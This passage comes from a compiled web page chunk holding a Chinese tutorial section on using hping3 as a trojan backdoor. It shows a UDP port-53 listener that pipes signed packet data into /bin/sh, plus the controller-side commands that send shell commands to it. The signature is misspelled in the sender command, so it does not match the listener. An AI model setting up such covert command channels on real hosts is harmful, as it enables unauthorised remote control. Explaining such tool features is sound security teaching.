aria-hidden="true">#</a></h3><p>\u5982\u679CHping3\u80FD\u591F\u5728\u8FDC\u7A0B\u4E3B\u673A\u4E0A\u542F\u52A8\uFF0C\u90A3\u4E48\u53EF\u4EE5\u4F5C\u4E3A\u6728\u9A6C\u7A0B\u5E8F\u542F\u52A8\u76D1\u542C\u7AEF\u53E3\uFF0C\u5E76\u5728\u5EFA\u7ACB\u8FDE\u63A5\u540E\u6253\u5F00shell\u901A\u4FE1\u3002\u4E0Enetcat\u7684\u540E\u95E8\u529F\u80FD\u7C7B\u4F3C\u3002</p><p>\u793A\u4F8B\uFF1A\u672C\u5730\u6253\u5F0053\u53F7UDP\u7AEF\u53E3\uFF08DNS\u89E3\u6790\u670D\u52A1\uFF09\u76D1\u542C\u6765\u81EA192.168.10.66\u4E3B\u673A\u7684\u5305\u542B\u7B7E\u540D\u4E3Asignature\u7684\u6570\u636E\u5305\uFF0C\u5E76\u5C06\u6536\u5230\u7684\u6570\u636E\u8C03\u7528/bin/sh\u6267\u884C\u3002</p><p>\u5728\u6728\u9A6C\u542F\u52A8\u7AEF\uFF1A</p><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">hping3 192.168.10.66--listen signature --safe --udp -p 53 </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> /bin/sh</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>\u5728\u8FDC\u7A0B\u63A7\u5236\u7AEF\uFF1A</p><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#82AAFF;">echo</span><span style="color:#A6ACCD;"> ls </span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">test.cmd</span></span>
<span class="line"><span style="color:#A6ACCD;">hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>\u5C06\u5305\u542Bls\u547D\u4EE4\u7684\u6587\u4EF6\u52A0\u4E0A\u7B7E\u540Dsignature\u53D1\u9001\u5230192.168.10.44\u4E3B\u673A\u768453\u53F7UDP\u7AEF\u53E3\uFF0C\u5305\u6570\u636E\u957F\u5EA6\u4E3A100\u5B57\u8282\u3002</p><p>\u5F53\u7136\u8FD9\u91CC\u53EA\u662F\u7B80\u5355\u7684\u6F14\u793A\u7A0B\u5E8F\uFF0C\u771F\u5B9E\u7684\u573A\u666F\uFF0C\u63A7\u5236\u7AEF\u53EF\u4EE5\u5229\u76CAshell\u6267\u884C\u5F88\u591A\u7684\u9AD8\u7EA7\u590D\u6742\u7684\u64CD\u4F5C\u3002</p>`,42),r=[e];function c(i,o,t,d,C,A){return a(),n("div",null,r)}const h=s(p,[["render",c]]);export{u as __pageData,h as default};
